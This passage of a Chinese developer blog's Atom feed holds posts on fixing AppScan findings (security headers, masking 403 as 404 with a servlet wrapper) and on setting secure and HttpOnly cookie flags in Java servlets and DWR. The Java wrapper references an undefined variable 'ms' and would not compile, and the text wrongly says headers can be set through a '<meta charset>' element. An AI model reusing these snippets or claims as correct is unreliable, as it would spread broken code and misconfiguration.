  </entry>
  
  <entry>
    <title>修正一些AppScan低等级风险漏洞</title>
    <link href="https://blog.yanzhe.tk/2017/02/27/fix-some-appscan-low-level-bugs/"/>
    <id>https://blog.yanzhe.tk/2017/02/27/fix-some-appscan-low-level-bugs/</id>
    <published>2017-02-27T08:34:15.000Z</published>
    <updated>2020-08-23T01:48:10.243Z</updated>
    
    <content type="html"><![CDATA[<h2 id="AppScan中的一些低等级风险的问题修正建议"><a href="#AppScan中的一些低等级风险的问题修正建议" class="headerlink" title="AppScan中的一些低等级风险的问题修正建议"></a>AppScan中的一些低等级风险的问题修正建议</h2><p>另外，关于安全<a href="https://github.com/FallibleInc/security-guide-for-developers">实用性开发人员安全须知</a></p><h3 id="未停用密码栏位的自动完成HTML属性"><a href="#未停用密码栏位的自动完成HTML属性" class="headerlink" title="未停用密码栏位的自动完成HTML属性"></a>未停用密码栏位的自动完成HTML属性</h3><p>将HTML中的<code>input</code>元素的<code>password</code>栏位补上<code>autocomplete</code>属性。默认为<code>on</code>，变更为<code>off</code>。PS:该栏位为HTML5新增HTML属性 <code>&lt;!DOCTYPE html&gt;</code>。</p><h3 id="遗漏”Content-Security-Policy”标头"><a href="#遗漏”Content-Security-Policy”标头" class="headerlink" title="遗漏”Content-Security-Policy”标头"></a>遗漏”Content-Security-Policy”标头</h3><p>配置CSP(Content-Security-Policy)，在HTTP标头中配置/<code>&lt;meta charset=&quot;utf-8&quot;&gt;</code>中配置。可简单使用，设置值为<code>default-src &#39;self&#39;</code>。<br>CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。<br>关于<a href="http://yanzhe919.github.io/2017/02/27/content-security-policy/">CSP入门</a><a href="http://www.ruanyifeng.com/blog/2016/09/csp.html">原文-阮一峰</a></p><h3 id="遗漏”X-Content-Type-Options”标头"><a href="#遗漏”X-Content-Type-Options”标头" class="headerlink" title="遗漏”X-Content-Type-Options”标头"></a>遗漏”X-Content-Type-Options”标头</h3><p>配置X-Content-Type-Options，在HTTP标头中配置/<code>&lt;meta charset=&quot;utf-8&quot;&gt;</code>中配置。使用时，值设置为<code>nosniff</code>。</p><p>值得注意的是，当使用该HTTP标头时，浏览器会检查HTTP响应标头的Content-Type中的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME类型</a>。当类型不符时，将被拦截。例如<code>.png</code>如HTTP响应标头中的Content-Type不为<code>image/png</code>时，将显示失败。</p><h4 id="文件类型的分类"><a href="#文件类型的分类" class="headerlink" title="文件类型的分类"></a>文件类型的分类</h4><table><thead><tr><th>类型</th><th align="center">描述</th><th align="right">典型示例</th></tr></thead><tbody><tr><td>text</td><td align="center">表明文件是普通文本，理论上是可读的语言</td><td align="right">text/plain, text/html, text/css, text/javascript</td></tr><tr><td>image</td><td align="center">表明是某种图像。不包括视频，但是动态图（比如动态gif）也使用image类型</td><td align="right">image/gif, image/png, image/jpeg, image/bmp, image/webp,image/svg+xml(SVG矢量图)</td></tr><tr><td>audio</td><td align="center">表明是某种音频文件</td><td align="right">audio/midi, audio/mpeg, audio/webm, audio/ogg, audio/wav</td></tr><tr><td>video</td><td align="center">表明是某种视频文件</td><td align="right">video/webm, video/ogg</td></tr><tr><td>application</td><td align="center">表明是某种二进制数据</td><td align="right">application/octet-stream, application/pkcs12, application/vnd.mspowerpoint, application/xhtml+xml, application/xml, application/pdf</td></tr></tbody></table><h4 id="在web环境最常用的视频文件的格式"><a href="#在web环境最常用的视频文件的格式" class="headerlink" title="在web环境最常用的视频文件的格式"></a>在web环境最常用的视频文件的格式</h4><table><thead><tr><th>MIME 类型</th><th align="center">音频或视频类型</th></tr></thead><tbody><tr><td>audio/wave audio/wav audio/x-wav audio/x-pn-wav</td><td align="center">音频流媒体文件。一般支持PCM音频编码，其他解码器有限支持（如果有的话）。</td></tr><tr><td>audio/webm</td><td align="center">WebM 音频文件格式。Vorbis 和 Opus 是其最常用的解码器。</td></tr><tr><td>video/webm</td><td align="center">采用WebM视频文件格式的音视频文件。VP8 和 VP9是其最常用的视频解码器。Vorbis 和 Opus 是其最常用的音频解码器。</td></tr><tr><td>audio/ogg</td><td align="center">采用OGG多媒体文件格式的音频文件。 Vorbis 是这个多媒体文件格式最常用的音频解码器。</td></tr><tr><td>video/ogg</td><td align="center">采用OGG多媒体文件格式的音视频文件。常用的视频解码器是 Theora；音频解码器为Vorbis 。</td></tr><tr><td>application/ogg</td><td align="center">采用OGG多媒体文件格式的音视频文件。常用的视频解码器是 Theora；音频解码器为Vorbis 。</td></tr></tbody></table><h4 id="JavaScript的MIME类型"><a href="#JavaScript的MIME类型" class="headerlink" title="JavaScript的MIME类型"></a><strong>JavaScript的MIME类型</strong></h4><ul><li>application/ecmascript</li><li>application/javascript</li><li>application/x-ecmascript</li><li>application/x-javascript</li><li>text/ecmascript</li><li>text/javascript</li><li>text/javascript1.0</li><li>text/javascript1.1</li><li>text/javascript1.2</li><li>text/javascript1.3</li><li>text/javascript1.4</li><li>text/javascript1.5</li><li>text/jscript</li><li>text/livescript</li><li>text/x-ecmascript</li><li>text/x-javascript</li></ul><p>以下类型的MIME类型(带参或不带参数)禁止解释为脚本语言</p><ul><li>text/plain</li><li>text/xml</li><li>application/octet-stream</li><li>application/xml</li></ul><p>更详细的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Complete_list_of_MIME_types">MIME类型表</a></p><h3 id="遗漏”X-XSS-Protection”标头"><a href="#遗漏”X-XSS-Protection”标头" class="headerlink" title="遗漏”X-XSS-Protection”标头"></a>遗漏”X-XSS-Protection”标头</h3><p>配置X-XSS-Protection，在HTTP标头中配置/<code>&lt;meta charset=&quot;utf-8&quot;&gt;</code>中配置。使用时，值设置为<code>1</code>。</p><ul><li>X-XSS-Protection: 0 (禁用XSS过滤)</li><li>X-XSS-Protection: 1 (启用XSS过滤（一般默认在浏览器中）。如果检测到跨站脚本攻击，浏览器将消毒页面（删除不安全的部分）。)</li><li>X-XSS-Protection: 1; mode=block (启用XSS过滤。而非消毒的页面，如果在检测到攻击的浏览器将防止页面的呈现。)</li><li>X-XSS-Protection: 1; report=<reporting-uri>(Chromium only) (启用XSS过滤。如果检测到跨站脚本攻击，浏览器将消毒页面并报告违规。本品采用CSP的功能report-uri指令发送报告。)</reporting-uri></li></ul><h3 id="遗漏HTTP-Strict-Transport-Security标头"><a href="#遗漏HTTP-Strict-Transport-Security标头" class="headerlink" title="遗漏HTTP Strict-Transport-Security标头"></a>遗漏HTTP Strict-Transport-Security标头</h3><p><a href="https://zh.wikipedia.org/wiki/HTTP%E4%B8%A5%E6%A0%BC%E4%BC%A0%E8%BE%93%E5%AE%89%E5%85%A8">HTTP严格传输安全</a>（英语：HTTP Strict Transport Security，缩写：HSTS）是一套由互联网工程任务组发布的互联网安全策略机制。网站可以选择使用HSTS策略，来让浏览器强制使用HTTPS与网站进行通信，以减少会话劫持风险。</p><p>配置HTTP Strict-Transport-Security，在HTTP标头中配置/<code>&lt;meta charset=&quot;utf-8&quot;&gt;</code>中配置。使用时，一般值设置为<code>max-age=31536000</code> (一年内有效)。</p><p>HSTS的作用是强制客户端（如浏览器）使用HTTPS与服务器创建连接。服务器开启HSTS的方法是，当客户端通过HTTPS发出请求时，在服务器返回的超文本传输协议响应头中包含<code>Strict-Transport-Security</code>字段。非加密传输时设置的HSTS字段无效。[3]<br>比如，<code>https://example.com/</code> 的响应头含有<code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code>。这意味着两点：</p><ul><li>在接下来的一年（即31536000秒）中，浏览器只要向example.com或其子域名发送HTTP请求时，必须采用HTTPS来发起连接。比如，用户点击超链接或在地址栏输入 <code>http://www.example.com/</code> ，浏览器应当自动将 http 转写成 https，然后直接向 <code>https://www.example.com/</code> 发送请求。</li><li>在接下来的一年中，如果 example.com 服务器发送的TLS证书无效，用户不能忽略浏览器警告继续访问网站。</li></ul><p>HSTS 简单来说就是强制 HTTPS。这需要分两步，第一步是你的服务器声明愿意放弃HTTP强制所有访问为安全的HTTPS。第二步是向几大浏览器 提起申请。在没有正式接受之前只要用户第一次访问之后，浏览器还是会记住你的HSTS爱好并且之后都会强制 HTTPS 而不是由服务端通过301转向。第二步需要慎用，因为据说难以反悔。一般来说只进行第一步就可以了。</p><h1 id="max-age-记住的时长-单位是秒-31536000-1-年"><a href="#max-age-记住的时长-单位是秒-31536000-1-年" class="headerlink" title="max-age: 记住的时长, 单位是秒 (31536000 = 1 年)"></a>max-age: 记住的时长, 单位是秒 (31536000 = 1 年)</h1><h1 id="includeSubdomains-所有子域名都强制使用-https-访问-这个如果不确定千万别开。"><a href="#includeSubdomains-所有子域名都强制使用-https-访问-这个如果不确定千万别开。" class="headerlink" title="includeSubdomains: 所有子域名都强制使用 https 访问, 这个如果不确定千万别开。"></a>includeSubdomains: 所有子域名都强制使用 https 访问, 这个如果不确定千万别开。</h1><h1 id="preload-告诉浏览器可以预加载你的域名的-HSTS。"><a href="#preload-告诉浏览器可以预加载你的域名的-HSTS。" class="headerlink" title="preload: 告诉浏览器可以预加载你的域名的 HSTS。"></a>preload: 告诉浏览器可以预加载你的域名的 HSTS。</h1><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>HSTS可以用来抵御SSL剥离攻击。SSL剥离攻击是中间人攻击的一种，由Moxie Marlinspike于2009年发明。他在当年的黑帽大会上发表的题为“New Tricks For Defeating SSL In Practice”的演讲中将这种攻击方式公开。SSL剥离的实施方法是阻止浏览器与服务器创建HTTPS连接。它的前提是用户很少直接在地址栏输入https://，用户总是通过点击链接或3xx重定向，从HTTP页面进入HTTPS页面。所以攻击者可以在用户访问HTTP页面时替换所有https://开头的链接为http://，达到阻止HTTPS的目的。<br>HSTS可以很大程度上解决SSL剥离攻击，因为只要浏览器曾经与服务器创建过一次安全连接，之后浏览器会强制使用HTTPS，即使链接被换成了HTTP。<br>另外，如果中间人使用自己的自签名证书来进行攻击，浏览器会给出警告，但是许多用户会忽略警告。HSTS解决了这一问题，一旦服务器发送了HSTS字段，用户将不再允许忽略警告。</p><h4 id="不足"><a href="#不足" class="headerlink" title="不足"></a>不足</h4><p>用户首次访问某网站是不受HSTS保护的。这是因为首次访问时，浏览器还未收到HSTS，所以仍有可能通过明文HTTP来访问。解决这个不足目前有两种方案，一是浏览器预置HSTS域名列表，Google Chrome、Firefox、Internet Explorer和Microsoft Edge实现了这一方案。二是将HSTS信息加入到域名系统记录中。但这需要保证DNS的安全性，也就是需要部署域名系统安全扩展。截至2016年这一方案没有大规模部署。<br>由于HSTS会在一定时间后失效（有效期由max-age指定），所以浏览器是否强制HSTS策略取决于当前系统时间。部分操作系统经常通过网络时间协议更新系统时间，如Ubuntu每次连接网络时，OS X Lion每隔9分钟会自动连接时间服务器。攻击者可以通过伪造NTP信息，设置错误时间来绕过HSTS。解决方法是认证NTP信息，或者禁止NTP大幅度增减时间。比如Windows 8每7天更新一次时间，并且要求每次NTP设置的时间与当前时间不得超过15小时。</p><h4 id="浏览器支持"><a href="#浏览器支持" class="headerlink" title="浏览器支持"></a>浏览器支持</h4><ul><li>Chromium和Google Chrome从4.0.211.0版本开始支持HSTS</li><li>Firefox 4及以上版本</li><li>Opera 12及以上版本</li><li>Safari从OS X Mavericks起</li><li>Internet Explorer和Microsoft Edge从Windows 10开始支持</li></ul><h3 id="检查到隐藏目录-403禁止改为404不存在"><a href="#检查到隐藏目录-403禁止改为404不存在" class="headerlink" title="检查到隐藏目录(403禁止改为404不存在)"></a>检查到隐藏目录(403禁止改为404不存在)</h3><p>可以的话，将回应状态码[403 - 禁止] 改为[404 - 不存在]，这样会将网站目录模糊化，可以防止泄漏网站结构。</p><p>可以在filter过滤器中自写wrapper，重写sendError。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yz.test.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequestWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponseWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">YZHttpServletResponseWrapper</span> <span class="keyword">extends</span> <span class="title">HttpServletResponseWrapper</span></span>&#123;</span><br><span class="line">    HttpServletResponse _response;</span><br><span class="line">    HttpServletRequest _request;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">YZHttpServletResponseWrapper</span><span class="params">(HttpServletRequest request,HttpServletResponse response)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(response);</span><br><span class="line">        _response = response;</span><br><span class="line">        _request = request;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendError</span><span class="params">(<span class="keyword">int</span> sc,String msg)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        String path = _request.getServletPath() + _request.getPathInfo();</span><br><span class="line">        <span class="keyword">if</span>(sc == <span class="number">403</span> &amp;&amp; path != <span class="keyword">null</span>)&#123;</span><br><span class="line">            _response.sendError(<span class="number">404</span>,msg);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            _response.sendError(sc,msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendError</span><span class="params">(<span class="keyword">int</span> sc)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        String path = _request.getServletPath() + _request.getPathInfo();</span><br><span class="line">        <span class="keyword">if</span>(sc == <span class="number">403</span> &amp;&amp; path != <span class="keyword">null</span>)&#123;</span><br><span class="line">            _response.sendError(<span class="number">404</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            _response.sendError(sc,ms);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      HTML5中password属性autocomplete=&quot;off&quot;。Content-Security-Policy:default-src &#39;self&#39;。X-Content-Type-Options:nosniff。X-XSS-Protection:1。Strict-Transport-Security:max-age=31536000。403改为404，可在filter中自写wrapper，重写sendError。
    
    </summary>
    
    
      <category term="Java" scheme="https://blog.yanzhe.tk/categories/java/"/>
    
    
      <category term="Java" scheme="https://blog.yanzhe.tk/tags/java/"/>
    
      <category term="安全" scheme="https://blog.yanzhe.tk/tags/security/"/>
    
      <category term="AppScan" scheme="https://blog.yanzhe.tk/tags/appscan/"/>
    
      <category term="403改为404" scheme="https://blog.yanzhe.tk/tags/403%E6%94%B9%E4%B8%BA404/"/>
    
  </entry>
  
  <entry>
    <title>servlet 2.5及3.0设置cookie secure httponly等属性</title>
    <link href="https://blog.yanzhe.tk/2017/02/27/servlet-2-5-and-3-0-set-cookie-secure-httponly/"/>
    <id>https://blog.yanzhe.tk/2017/02/27/servlet-2-5-and-3-0-set-cookie-secure-httponly/</id>
    <published>2017-02-27T05:43:55.000Z</published>
    <updated>2020-08-23T01:48:10.251Z</updated>
    
    <content type="html"><![CDATA[<p>安全标记是可以由应用服务器的HTTP响应中发送一个新的cookie给用户时，可以设置一个选项。安全标志的目的是阻止cookies未授权方被观察由于Cookie的明文传输。<br>为了实现这一目标，支持安全标志的浏览器将只与安全标志时请求去一个HTTPS页面发送cookie。以另一种方式说，浏览器不会设置通过未加密的HTTP请求的安全标志发送的cookie。<br>通过设置安全标记，浏览器将防止通过未加密的信道的cookie的传输。<br><a href="https://www.owasp.org/index.php/SecureFlag">SecureFlag</a></p><p>增加 cookie 安全性添加HttpOnly和secure属性</p><h2 id="属性简单说明"><a href="#属性简单说明" class="headerlink" title="属性简单说明"></a>属性简单说明</h2><h3 id="secure属性"><a href="#secure属性" class="headerlink" title="secure属性"></a>secure属性</h3><p>当设置为true时，表示创建的 Cookie 会被以安全的形式向服务器传输，也就是只能在 HTTPS 连接中被浏览器传递到服务器端进行会话验证，如果是 HTTP 连接则不会传递该信息，所以不会被窃取到Cookie 的具体内容。</p><h3 id="HttpOnly属性"><a href="#HttpOnly属性" class="headerlink" title="HttpOnly属性"></a>HttpOnly属性</h3><p>如果在Cookie中设置了”HttpOnly”属性，那么通过程序(JS脚本、Applet等)将无法读取到Cookie信息，这样能有效的防止XSS攻击。</p><h2 id="Servlet不同版本Web-xml的差异"><a href="#Servlet不同版本Web-xml的差异" class="headerlink" title="Servlet不同版本Web.xml的差异"></a>Servlet不同版本Web.xml的差异</h2><p><code>web.xml</code>是Java Web Application的一种描述Web项目如何部署的配置文件。</p><h3 id="1-Servlet-3-1-deployment-descriptor-Java-EE-7"><a href="#1-Servlet-3-1-deployment-descriptor-Java-EE-7" class="headerlink" title="1.Servlet 3.1 deployment descriptor,Java EE 7"></a>1.Servlet 3.1 deployment descriptor,Java EE 7</h3><p>Java EE 7 XML schema, namespace is <a href="http://xmlns.jcp.org/xml/ns/javaee/">http://xmlns.jcp.org/xml/ns/javaee/</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee </span></span></span><br><span class="line"><span class="tag"><span class="string">         http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"3.1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-Servlet-3-0-deployment-descriptor-Java-EE-6"><a href="#2-Servlet-3-0-deployment-descriptor-Java-EE-6" class="headerlink" title="2. Servlet 3.0 deployment descriptor,Java EE 6"></a>2. Servlet 3.0 deployment descriptor,Java EE 6</h3><p>Java EE 6 XML schema, namespace is <a href="http://java.sun.com/xml/ns/javaee">http://java.sun.com/xml/ns/javaee</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/javaee </span></span></span><br><span class="line"><span class="tag"><span class="string">          http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">version</span>=<span class="string">"3.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-Servlet-2-5-deployment-descriptor-Java-EE-5"><a href="#3-Servlet-2-5-deployment-descriptor-Java-EE-5" class="headerlink" title="3. Servlet 2.5 deployment descriptor,Java EE 5"></a>3. Servlet 2.5 deployment descriptor,Java EE 5</h3><p>Java EE 5 XML schema, namespace is <a href="http://java.sun.com/xml/ns/javaee">http://java.sun.com/xml/ns/javaee</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/javaee </span></span></span><br><span class="line"><span class="tag"><span class="string">          http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">version</span>=<span class="string">"2.5"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-Servlet-2-4-deployment-descriptor-J2EE-1-4"><a href="#4-Servlet-2-4-deployment-descriptor-J2EE-1-4" class="headerlink" title="4. Servlet 2.4 deployment descriptor,J2EE 1.4"></a>4. Servlet 2.4 deployment descriptor,J2EE 1.4</h3><p>J2EE 1.4 XML schema, namespace is <a href="http://java.sun.com/xml/ns/j2ee">http://java.sun.com/xml/ns/j2ee</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/j2ee"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/j2ee </span></span></span><br><span class="line"><span class="tag"><span class="string">          http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">version</span>=<span class="string">"2.4"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Servlet 2.4 Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-Servlet-2-3-deployment-descriptor-J2EE-1-3"><a href="#5-Servlet-2-3-deployment-descriptor-J2EE-1-3" class="headerlink" title="5. Servlet 2.3 deployment descriptor,J2EE 1.3"></a>5. Servlet 2.3 deployment descriptor,J2EE 1.3</h3><p>J2EE 1.3 DTDs schema. This web.xml file is too old, highly recommend you to upgrade it.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"http://java.sun.com/dtd/web-app_2_3.dtd"</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Servlet 2.3 Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Servlet 2.3到3.0之间的改变可以访问<a href="http://en.wikipedia.org/wiki/Java_Servlet">Servlet wiki</a>查看详细。</p><h2 id="设置Cookie属性"><a href="#设置Cookie属性" class="headerlink" title="设置Cookie属性"></a>设置Cookie属性</h2><h3 id="Servlet-3-0-及以上版本设置Web-xml"><a href="#Servlet-3-0-及以上版本设置Web-xml" class="headerlink" title="Servlet 3.0 及以上版本设置Web.xml"></a>Servlet 3.0 及以上版本设置Web.xml</h3><p>Servlet 3.0及以上版本支持在Web.xml中设置所有的session cookie 属性为Secure HttpOnly。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">session-config</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cookie-config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">secure</span>&gt;</span>true<span class="tag">&lt;/<span class="name">secure</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">http-only</span>&gt;</span>true<span class="tag">&lt;/<span class="name">http-only</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cookie-config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">session-config</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DWR的cookie-DWRSESSIONID的设置"><a href="#DWR的cookie-DWRSESSIONID的设置" class="headerlink" title="DWR的cookie DWRSESSIONID的设置"></a>DWR的cookie DWRSESSIONID的设置</h3><p>DWR默认cookie值 <code>path=${contextPath}</code></p><p>Examples of attribute strings:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">domain=mydomain.com</span><br><span class="line">path=/mypath; secure</span><br></pre></td></tr></table></figure><p>The cookie attributes are configured through the cookieAttributes setting in web.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>cookieAttributes<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>path=/mypath; secure<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure><p>or setter from JavaScript after including engine.js:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dwr.engine.setCookieAttributes(<span class="string">"path=/mypath; secure"</span>);</span><br></pre></td></tr></table></figure><p>or by making configuration before including engine.js:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dwrConfig &#123;</span><br><span class="line">    cookieAttributes: <span class="string">"path=/mypath; secure"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>or the corresponding for AMD loading:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>.config(&#123;</span><br><span class="line">    (other AMD settings)</span><br><span class="line">    config: &#123;</span><br><span class="line">        <span class="string">"dwr/amd/engine"</span>: &#123;</span><br><span class="line">            cookieAttributes: <span class="string">"path=/mypath; secure"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="在Java代码中为Cookie写Filter"><a href="#在Java代码中为Cookie写Filter" class="headerlink" title="在Java代码中为Cookie写Filter"></a>在Java代码中为Cookie写Filter</h3><p>在Web.xml中配置CookieFilter</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>cookieFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span 